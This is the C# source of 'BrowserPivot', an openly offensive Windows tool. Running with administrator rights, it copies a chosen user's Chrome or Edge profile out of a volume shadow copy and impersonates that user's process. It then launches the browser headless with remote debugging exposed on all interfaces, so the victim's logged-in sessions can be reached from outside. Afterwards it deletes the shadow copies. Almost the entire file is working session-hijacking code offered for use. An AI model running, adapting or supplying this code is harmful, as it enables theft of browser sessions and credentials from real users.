using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using BrowserPivot;
using System.Text;
using System.Security.Principal;
using System.Linq;
using CommandLine;
using System.Net;
using System.IO;
using System.Threading.Tasks;

class Program
{
    #region Windows API

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    private const uint WM_GETTEXT = 0x000D;
    private const uint WM_GETTEXTLENGTH = 0x000E;

    #endregion
    public static bool IsHighIntegrity()
    {
        // returns true if the current process is running with adminstrative privs in a high integrity context
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }


    public static void banner()
    {
        Console.WriteLine(@"
 ____                                  _____ _            _   
|  _ \                                |  __ (_)          | |  
| |_) |_ __ _____      _____  ___ _ __| |__) |__   _____ | |_ 
|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  ___/ \ \ / / _ \| __|
| |_) | | | (_) \ V  V /\__ \  __/ |  | |   | |\ V / (_) | |_ 
|____/|_|  \___/ \_/\_/ |___/\___|_|  |_|   |_| \_/ \___/ \__|      
");
    }

    

    class Options
    {
        [Option('p', "pid", Required = true, HelpText = "Process ID.")]
        public string Pid { get; set; }

        [Option('l', "port", Required = true, HelpText = "Local port.")]
        public string Port { get; set; }

        [Option('b', "browser", Required = true, HelpText = "Browser (chrome or msedge).")]
        public string Browser { get; set; }
    }

    const string dll_path = "CommandLine.dll";

    


    static void Main(string[] args)
    {

        if (!IsHighIntegrity())
        {
            Console.WriteLine("[!] Not in high integrity !!");
        }
        else 
        {
            banner();
            Parser.Default.ParseArguments<Options>(args)
            .WithParsed<Options>(options =>
            {
                // 处理命令行参数
                string pid = options.Pid;
                string port = options.Port;
                string browser = options.Browser;

                string volume = "C:\\";
                string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";    // 可选字符集合
                Random random = new Random();
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 10; i++)
                {
                    sb.Append(chars[random.Next(chars.Length)]);
                }
                string randomString = sb.ToString();
                using (ManagementClass classInstance = new ManagementClass("Win32_ShadowCopy"))
                {
                    ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
                    inParams["Volume"] = volume;
                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
                }
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ShadowCopy"))
                {
                    //foreach (ManagementObject obj in searcher.Get())
                    ManagementObject obj = searcher.Get().OfType<ManagementObject>().FirstOrDefault();
                    if (obj != null)
                    {
                        Console.WriteLine("[+] Volume: " + obj["VolumeName"]);
                        Console.WriteLine("[+] Shadow copy ID: " + obj["ID"]);
                        Console.WriteLine("[+] Shadow copy device name: " + obj["DeviceObject"]);

                        string userpath = createprogress.ImpersonUser(int.Parse(pid));
                        string[] parts = userpath.Split('\\');
                        string user = parts[1];
                        string sourcePathEdge = $"{obj["DeviceObject"]}\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data";
                        string sourcePathChrome = $"{obj["DeviceObject"]}\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data";
                        string targetPath = $@"C:\Users\{user}\AppData\Local\{randomString}";

                        string sourcePath = "";
                        switch (browser)
                        {
                            case "chrome":
                                sourcePath = sourcePathChrome;
                                break;
                            case "msedge":
                                sourcePath = sourcePathEdge;
                                break;
                        }
                        try
                        {
                            Console.WriteLine("[+] Copy directory {0} to directory {1}", sourcePath, targetPath);
                            file_managent.copy_folder(sourcePath, targetPath);
                            int processId = Process.GetProcessesByName(browser).First().Id; // 指定进程的 ID
                            Process process = Process.GetProcessById(processId);
                            string processPath = process.MainModule.FileName;
                            Console.WriteLine("[+] {0} path: {1}" ,browser, processPath);
                            string cmd = processPath + " --user-data-dir=" + targetPath + " --remote-debugging-port=" + port + " --remote-debugging-address=0.0.0.0 --headless about:blank";
                            Priviledge.EnableDebugPri(int.Parse(pid));
                            createprogress.CreateProgress(int.Parse(pid), cmd);
                            ManagementScope scope = new ManagementScope("\\\\localhost\\root\\cimv2");
                            scope.Connect();
                            // 构造查询语句
                            string query = $"SELECT * FROM Win32_ShadowCopy WHERE ID=" + obj["ID"];

                            // 执行查询
                            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(scope, new ObjectQuery(query));
                            ManagementObjectCollection results = searcher.Get();
                            foreach (ManagementObject res in results)
                            {
                                res.Delete();
                            }
                            Console.WriteLine("[+] Shadows deleted successfully");
                        }
                        catch (Exception ex)
                        {
                            ManagementScope scope = new ManagementScope("\\\\localhost\\root\\cimv2");
                            scope.Connect();
                            // 构造查询语句
                            string query = $"SELECT * FROM Win32_ShadowCopy WHERE ID=" + obj["ID"];

                            // 执行查询
                            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(scope, new ObjectQuery(query));
                            ManagementObjectCollection results = searcher.Get();
                            Console.WriteLine("[-] Error: " + ex);
                            foreach (ManagementObject result in results)
                            {
                                result.Delete();
                            }
                            Console.WriteLine("[+] Delete shadows success");
                        }
                    }
                }
            })
            .WithNotParsed<Options>(errors =>
            {
                // 处理解析错误
            });
        }
    }
}
